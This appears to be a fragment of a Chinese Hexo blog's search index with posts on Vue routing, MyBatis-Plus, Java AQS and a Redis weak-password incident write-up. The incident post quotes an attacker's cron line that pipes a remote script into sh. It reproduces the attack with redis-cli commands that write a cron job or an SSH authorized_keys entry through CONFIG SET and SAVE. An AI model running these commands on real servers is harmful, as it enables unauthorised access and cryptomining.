&quot;../components/Homenews&quot;; </span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">path</span>: <span class=\"string\">&#x27;/home&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">component</span>: Home,</span><br><span class=\"line\">    <span class=\"attr\">children</span>: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"attr\">path</span>: <span class=\"string\">&#x27;news&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">component</span>: <span class=\"function\">()=&gt;</span><span class=\"keyword\">import</span>(<span class=\"string\">&#x27;../components/Homenews&#x27;</span>)</span><br><span class=\"line\">      <span class=\"comment\">//component: Homenews</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"attr\">path</span>: <span class=\"string\">&#x27;messages&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">component</span>: <span class=\"function\">()=&gt;</span><span class=\"keyword\">import</span>(<span class=\"string\">&#x27;../components/Homemessages&#x27;</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>  在父组件的vue文件中编写相关的router-link与router-view,router-link要写完整路径</p>\n  <figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>我是首页<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>我是首页内容，哈哈哈<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">router-link</span> <span class=\"attr\">to</span>=<span class=\"string\">&quot;/home/news&quot;</span>&gt;</span>新闻<span class=\"tag\">&lt;/<span class=\"name\">router-link</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">router-link</span> <span class=\"attr\">to</span>=<span class=\"string\">&quot;/home/messages&quot;</span>&gt;</span>消息<span class=\"tag\">&lt;/<span class=\"name\">router-link</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">router-view</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">router-view</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220213164214432.png\" alt=\"image-20220213164214432\"></p>\n<p><code>&lt;router-link :to=&quot;&#123;path:&#39;/xxxx&#39;,query:&#123;name:&#39;why&#39;,age:&#39;12&#39;&#125;&#125;&quot;&gt;&lt;/router-link&gt;</code></p>\n<p>想要取用变量的话直接<code>&#123;&#123;$route.query&#125;&#125;</code>或者<code>&#123;&#123;$route.query.变量名&#125;&#125;</code></p>\n<p>如果是通过button跳转而不是router-link，可以直接</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"title\">onclick</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  $this.router.push(&#123;</span><br><span class=\"line\">\t<span class=\"attr\">path</span>:<span class=\"string\">&#x27;/xxxx&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">query</span>:&#123;</span><br><span class=\"line\">        <span class=\"attr\">name</span>:<span class=\"string\">&#x27;abc&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">age</span>:<span class=\"number\">13</span>,</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h3 id=\"路由的懒加载\"><a href=\"#路由的懒加载\" class=\"headerlink\" title=\"路由的懒加载\"></a>路由的懒加载</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220213101415961.png\" alt=\"image-20220213101415961\"></p>\n<h1 id=\"请注意：与-的使用\"><a href=\"#请注意：与-的使用\" class=\"headerlink\" title=\"请注意：与 =的使用\"></a>请注意：与 =的使用</h1><p>箭头函数的this会一层层地往外找，普通函数的this是window</p>\n","categories":["前端"],"tags":["hexo"]},{"title":"MP的入门使用","url":"/p/66009/","content":"<h1 id=\"Mybatis-Plus\"><a href=\"#Mybatis-Plus\" class=\"headerlink\" title=\"Mybatis-Plus\"></a>Mybatis-Plus</h1><h2 id=\"入门\"><a href=\"#入门\" class=\"headerlink\" title=\"入门\"></a>入门</h2><p>写好的mapper接口继承mybatis-plus的BaseMapper接口，基本的增删改查就写好了。启动类记得扫描mapper包</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Repository</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">UserMapper</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseMapper</span>&lt;<span class=\"title\">User</span>&gt; </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@MapperScan(&quot;com.iu2wyt.mapper&quot;)</span>  或者上面加<span class=\"meta\">@Mapper</span></span><br></pre></td></tr></table></figure>\n\n<p>插入时如果没设置id会自动生成</p>\n<h3 id=\"主键自动生成策略\"><a href=\"#主键自动生成策略\" class=\"headerlink\" title=\"主键自动生成策略\"></a>主键自动生成策略</h3><p>（自增算法，uuid，雪花算法，zk，redis）</p>\n<blockquote>\n<p>​    默认ID_WORKER 全局唯一ID</p>\n</blockquote>\n<ol>\n<li>雪花算法，字段上<code>@TableId(type = IdtType.worker)</code>唯一</li>\n</ol>\n<p>snowflake是Twitter开源的分布式ID生成算法，结果是一个long型的ID（64位）。其核心思想是：前41bit使用当前毫秒数，10bit作为机器的ID（5个bit是数据中心位置代码，5个bit的机器ID），12bit作为毫秒内的流水号（意味着每个节点在每毫秒可以产生 4096个ID），最后还有一个符号位，永远是0。全球唯一</p>\n<blockquote>\n<p>​    主键自增</p>\n</blockquote>\n<ol start=\"2\">\n<li>需要配置主键自增，字段上<code>@TableId(type = IdtType.auto)</code>,同时注意数据库的字段也要自增 </li>\n</ol>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220216163047049.png\" alt=\"image-20220216163047049\"></p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自动填充\"><a href=\"#自动填充\" class=\"headerlink\" title=\"自动填充\"></a>自动填充</h2><p><code>@TableField</code></p>\n<h2 id=\"乐观锁\"><a href=\"#乐观锁\" class=\"headerlink\" title=\"乐观锁\"></a>乐观锁</h2><blockquote>\n<p>乐观锁：认为总是不会出现问题，干什么都上锁，如果出现问题，再次更新值测试！</p>\n<p>（当要更新记录时，希望这条记录没有被更新）</p>\n<p>乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果冲突，则返回给用户异常信息，让用户决定如何去做。乐观锁适用于读多写少的场景，这样可以提高程序的吞吐量。</p>\n<p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n<p>实现步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1. 数据库增加version字段</span></span><br><span class=\"line\"><span class=\"comment\">//2. 在实体类中增加字段，并添加注解`@Version`</span></span><br><span class=\"line\"><span class=\"comment\">//3. 配置插件</span></span><br><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> MybatisPlusInterceptor <span class=\"title\">mybatisPlusInterceptor</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    MybatisPlusInterceptor interceptor = <span class=\"keyword\">new</span> MybatisPlusInterceptor();</span><br><span class=\"line\">    interceptor.addInnerInterceptor(<span class=\"keyword\">new</span> OptimisticLockerInnerInterceptor());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> interceptor;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>悲观锁：认为总是会出现问题，无论干什么都上锁！再去操作</p>\n</blockquote>\n<h2 id=\"批量查询\"><a href=\"#批量查询\" class=\"headerlink\" title=\"批量查询\"></a>批量查询</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">updateaBatchIds</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\tList&lt;User&gt; users = userMapper.selectBatchIds(Arrays.asList(<span class=\"number\">1L</span>, <span class=\"number\">5L</span>, <span class=\"number\">6L</span>));</span><br><span class=\"line\">\tusers.forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">selectByMap</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\tHashMap&lt;String, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;String, Object&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">\tmap.put(<span class=\"string\">&quot;name&quot;</span>,<span class=\"string\">&quot;liudehua&quot;</span>);</span><br><span class=\"line\">\tmap.put(<span class=\"string\">&quot;age&quot;</span>,<span class=\"number\">23</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tList&lt;User&gt; users = userMapper.selectByMap(map);</span><br><span class=\"line\">\tSystem.out.println(users.toString());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分页查询\"><a href=\"#分页查询\" class=\"headerlink\" title=\"分页查询\"></a>分页查询</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">testpage</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\tPage&lt;User&gt; userPage = <span class=\"keyword\">new</span> Page&lt;&gt;(<span class=\"number\">2</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">\t\tuserMapper.selectPage(userPage,<span class=\"keyword\">null</span>);</span><br><span class=\"line\">\t\tSystem.out.println(userPage.getRecords());</span><br><span class=\"line\">\t\t<span class=\"comment\">//当前所在页数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> <span class=\"keyword\">long</span> current = userPage.getCurrent();</span><br><span class=\"line\">\t\t<span class=\"comment\">//总记录数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> <span class=\"keyword\">long</span> total = userPage.getTotal();</span><br><span class=\"line\">\t\t<span class=\"comment\">//总页数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> <span class=\"keyword\">long</span> pages = userPage.getPages();</span><br><span class=\"line\">\t\t<span class=\"comment\">//设置当前的页码userPage.setCurrent(1)</span></span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;pages===================&gt;&quot;</span>+pages);</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;total===================&gt;&quot;</span>+total);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">testVariousDel</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\tuserMapper.deleteBatchIds();</span><br><span class=\"line\">\t\tuserMapper.deleteById();</span><br><span class=\"line\">\t\tuserMapper.deleteByMap();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>逻辑删除：通过在数据库中修改某一字段的值逻辑上修改状态使其失效   </p>\n<p>​    如 deleteid=0 =&gt; deleteid=1,正常的deleteid字段值为0，逻辑删除后修改为1，在查询的时候带上条件deleteid=0就可以了。防止数据的丢失类似于回收站</p>\n<p>物理删除：从数据库中删除记录</p>\n</blockquote>\n<p>步骤：</p>\n<ol>\n<li><p>增加数据库字段以及实体表属性deleted</p>\n</li>\n<li><p>spring配置中增加默认删除得deleted值与没有删除的deleted值!收工</p>\n <figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">mybatis-plus.global-config.db-config.logic-delete-field</span>=<span class=\"string\">1</span></span><br><span class=\"line\"><span class=\"meta\">mybatis-plus.global-config.db-config.logic-not-delete-value</span>=<span class=\"string\">0</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>之后在查询中会自动拼接deleted=0</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220221144748827.png\" alt=\"image-20220221144748827\"></p>\n<p>在删除时会执行更新操作<code>userMapper.deleteById(2L)</code>;</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220221144930554.png\" alt=\"image-20220221144930554\"></p>\n<h2 id=\"性能分析插件\"><a href=\"#性能分析插件\" class=\"headerlink\" title=\"性能分析插件\"></a>性能分析插件</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">  &lt;groupId&gt;p6spy&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;p6spy&lt;/artifactId&gt;</span><br><span class=\"line\">  &lt;version&gt;最新版本&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"条件构造器\"><a href=\"#条件构造器\" class=\"headerlink\" title=\"条件构造器\"></a>条件构造器</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/77a65dd62de84930af4c681681b22c07.png\" alt=\"img\"></p>\n<p>通过链式编程将各个条件and在一起</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220221152636372.png\" alt=\"image-20220221152636372\"></p>\n<p>MySQL中，AND的执行优先级高于OR。也就是说，在没有小括号()的限制下，总是优先执行AND语句，再执行OR语句。</p>\n<h3 id=\"子查询\"><a href=\"#子查询\" class=\"headerlink\" title=\"子查询\"></a>子查询</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test4</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">final</span> QueryWrapper&lt;User&gt; wrapper = <span class=\"keyword\">new</span> QueryWrapper&lt;&gt;();</span><br><span class=\"line\">   wrapper.inSql(<span class=\"string\">&quot;id&quot;</span>,<span class=\"string\">&quot;select id from user where id&gt;50&quot;</span>);</span><br><span class=\"line\">   userMapper.selectObjs(wrapper).forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"orderby\"><a href=\"#orderby\" class=\"headerlink\" title=\"orderby\"></a>orderby</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test5</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">final</span> QueryWrapper&lt;User&gt; wrapper = <span class=\"keyword\">new</span> QueryWrapper&lt;&gt;();</span><br><span class=\"line\">   wrapper.orderByAsc(<span class=\"string\">&quot;id&quot;</span>);</span><br><span class=\"line\">   userMapper.selectObjs(wrapper).forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"代码自动生成器\"><a href=\"#代码自动生成器\" class=\"headerlink\" title=\"代码自动生成器\"></a>代码自动生成器</h2><p><a href=\"https://www.jb51.net/article/188251.html\">https://www.jb51.net/article/188251.html</a>  conusumer类详解，相当于一个处理器对接收的对象进行处理，但是没有返回值</p>\n<p><strong>3.5.1</strong>以上</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\tFastAutoGenerator.create(<span class=\"string\">&quot;jdbc:mysql://localhost:3306/mybatis_plus?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=GMT%2B8&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root&quot;</span>)</span><br><span class=\"line\">\t\t\t.globalConfig(builder -&gt; &#123;</span><br><span class=\"line\">\t\t\t\tbuilder.author(<span class=\"string\">&quot;ggxxyy&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.enableSwagger()</span><br><span class=\"line\">\t\t\t\t\t\t.fileOverride()</span><br><span class=\"line\">\t\t\t\t\t\t.outputDir(<span class=\"string\">&quot;src\\\\main\\\\java&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t;</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.packageConfig(builder -&gt; &#123;</span><br><span class=\"line\">\t\t\t\tbuilder.parent(<span class=\"string\">&quot;com.iu2wyt&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.moduleName(<span class=\"string\">&quot;shop&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.pathInfo(Collections.singletonMap(OutputFile.mapperXml,<span class=\"string\">&quot;src\\\\main\\\\java&quot;</span>))</span><br><span class=\"line\">\t\t\t\t\t\t.service(<span class=\"string\">&quot;serviceo&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.mapper(<span class=\"string\">&quot;mapperb&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.controller(<span class=\"string\">&quot;controllerj&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.entity(<span class=\"string\">&quot;entitye&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.xml(<span class=\"string\">&quot;testxml&quot;</span>)</span><br><span class=\"line\">\t\t\t\t\t\t.serviceImpl(<span class=\"string\">&quot;sim&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.strategyConfig(builder -&gt; &#123;</span><br><span class=\"line\">\t\t\t\tbuilder.addInclude(<span class=\"string\">&quot;user&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.templateEngine(<span class=\"keyword\">new</span> VelocityTemplateEngine())</span><br><span class=\"line\">\t\t\t.execute();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>分别是全局配置，包配置，策略配置，模板引擎，执行</p>\n<p>记得导入模板引擎以及swagger的依赖</p>\n","categories":["java"]},{"title":"redis弱口令邂逅","url":"/p/65033/","content":"<h1 id=\"记一个由于redis弱口令导致被当成矿机的记录\"><a href=\"#记一个由于redis弱口令导致被当成矿机的记录\" class=\"headerlink\" title=\"记一个由于redis弱口令导致被当成矿机的记录\"></a>记一个由于redis弱口令导致被当成矿机的记录</h1><h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><p>不久前腾讯服务器发来一封邮件警告我,说服务器用于挖矿,需要清除.这个服务器是之前学习springboot以及分布式时用来搭建实际生产环境的,搭建有常见的数据库,nginx以及tomcat等环境</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407105956525.png\" alt=\"image-20220407105956525\"></p>\n<p>震惊之余,我连忙连接上服务器查看,在连接ssh时就发现连接速度十分慢,估计有个将近1分钟,并且输入命令查询延迟十分高,估计是挖矿占用cpu过高.</p>\n<h2 id=\"排除过程\"><a href=\"#排除过程\" class=\"headerlink\" title=\"排除过程\"></a>排除过程</h2><p>先到腾讯服务器的控制台查看最近的外网流量进出以及磁盘的读写,发现最近几天cpu持续跑满,我连忙去查看3月17日的登录日志发现了一有个登录,印象中好久没有登录过这台服务器了,于是在腾讯的安全控制台中找到了这个ip,是一个广西的ip</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407111701896.png\" alt=\"image-20220407111701896\"></p>\n<ul>\n<li><p>通过<code>top -c</code>查看后找到占用最高的进程并找到其位置将其删除.</p>\n</li>\n<li><p>同时检查所有的定时任务文件<code>crontab -l</code>发现了有一个redis的乱码如下</p>\n<p>  <img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220407112531554.png\" alt=\"image-20220407112531554\"></p>\n<p>  在了解了定时任务的配置后,明白了这个文件中的3条命令每分钟触发一次,其中<code>cdt</code>与<code>wdt</code>在网上没有相关信息猜想可能是其他类型的主机上命令,只有<code>wget</code>能看懂,每分钟从<code>http://103.209.103.16:26800/ff.sh</code>下载文件并运行.可惜这个url已经失效了,查询一下是香港的vps,可能为了逃避法律责任,这台服务器已经到期了.</p>\n</li>\n</ul>\n<h2 id=\"修复过程\"><a href=\"#修复过程\" class=\"headerlink\" title=\"修复过程\"></a>修复过程</h2><p>首先将所有定时任务删除掉并禁用定时任务</p>\n<p>linux的定时任务有两种:</p>\n<ol>\n<li>系统的定时任务</li>\n</ol>\n<p>位于/etc/crontab 这个文件负责调度各种管理和维护任务。</p>\n<ol start=\"2\">\n<li>用户的定时任务</li>\n</ol>\n<p>/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</p>\n<ol start=\"3\">\n<li>其他</li>\n</ol>\n<p>还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>\n<p>检查rc.*文件是否有设置开机自启动</p>\n<p>同时删除掉下载的挖矿文件,</p>\n<p>利用<code>iptables -L -n</code>查看可疑的 地址与端口没有发现,</p>\n<p>利用<code>netstat -ntlp</code>查看端口占用防止有后门</p>\n<h2 id=\"复现过程\"><a href=\"#复现过程\" class=\"headerlink\" title=\"复现过程\"></a>复现过程</h2><p>在看到redis后想起之前部署redis时为了方便便把密码设置成了123456(因小失大!!:sob:),于是重新复现了这个漏洞</p>\n<p>连接到redis</p>\n<blockquote>\n<p><code>redis-cli -h target -a password(如果有的话)</code></p>\n</blockquote>\n<p>设置键</p>\n<blockquote>\n<p><code>set bar(名称随意) 定时任务</code></p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 也可以直接实现</span></span><br><span class=\"line\">echo &quot;*/1 * * * * wget -O - http://103.209.103.16:26800/ff.sh | sh -s&quot; &gt; foo.txt</span><br><span class=\"line\">cat foo.txt | redis-cli -h target -a password -x set foo </span><br></pre></td></tr></table></figure>\n\n\n\n<p>redis持久化,</p>\n<p>redis的config命令可以在redis运行中动态修改redis的配置,其中set后面的字段为配置字段名,重启后会失效,如果需要同步到配置文件中可以通过rewrite命令实现</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">config set dbfilename &quot;root&quot;</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> save实现持久化,将键值对写入,由于是文本文件打开,而不是db形式打开,所以会有乱码</span></span><br><span class=\"line\">save </span><br><span class=\"line\">exit</span><br></pre></td></tr></table></figure>\n\n<p>在写入cron后每一分钟就会实现一次.</p>\n<p>如果将命令换成公钥</p>\n<p>首先攻击者在本地生成好公私钥,通过redis实体化到target上最后用ssh的私钥登录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class=\"line\">(echo -e &quot;\\n&quot;;cat od_rsa.pub;echo -e &quot;\\n&quot;) &gt; foo.txt</span><br><span class=\"line\">cat foo.txt | redis-cli -h target -a password -x set foo </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 一样持久化</span></span><br><span class=\"line\">config set dir /root/.ssh</span><br><span class=\"line\">config set dbfilename &quot;authorized_keys&quot;</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> save实现持久化,将键值对写入,由于是文本文件打开,而不是db形式打开,所以会有乱码</span></span><br><span class=\"line\">save </span><br><span class=\"line\">exit</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 通过ssh连接</span></span><br><span class=\"line\">ssh -i id_rsa target</span><br></pre></td></tr></table></figure>\n\n\n\n<p>如果authorized_keys无法写入(root也无法修改),需要通过<code>lsattr </code>与<code>chattr</code>修改其属性</p>\n<p><strong>PS：有时候你发现用root权限都不能修改某个文件，大部分原因是曾经用chattr命令锁定该文件了。chattr命令的作用很大，其中一些功能是由Linux内核版本来支持的，不过现在生产绝大部分跑的linux系统都是2.6以上内核了。通过chattr命令修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录。lsattr命令是显示chattr命令设置的文件属性。</strong></p>\n<p>这两个命令是用来查看和改变文件、目录属性的，与chmod这个命令相比，chmod只是改变文件的读写、执行权限，更底层的属性控制是由chattr来改变的。</p>\n<blockquote>\n<p>+ ：在原有参数设定基础上，追加参数。</p>\n<p>- ：在原有参数设定基础上，移除参数。<br>= ：更新为指定参数设定。<br>A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。<br>S：硬盘I/O同步选项，功能类似sync。<br>a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。<br>c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。<br>d：即no dump，设定文件不能成为dump程序的备份目标。<br>i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。<br>i参数对于文件 系统的安全设置有很大帮助。<br>j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂  载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。<br>s：保密性地删除文件或目录，即硬盘空间被全部收回。<br>u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。 各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</p>\n</blockquote>\n","categories":["渗透测试"]},{"title":"AQS详解","url":"/p/65034/","content":"<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220526195408438.png\" alt=\"image-20220526195408438\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FairSync</span> <span class=\"keyword\">extends</span> <span class=\"title\">Sync</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> serialVersionUID = -<span class=\"number\">3000897897090466540L</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//加入等待队列acquire(1);</span></span><br><span class=\"line\">        acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//AQS的acquire方法会调用tryAcquire，判断是否获取锁成功。tryAcquire是子类实现的模板</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryAcquire</span><span class=\"params\">(<span class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Thread current = Thread.currentThread();</span><br><span 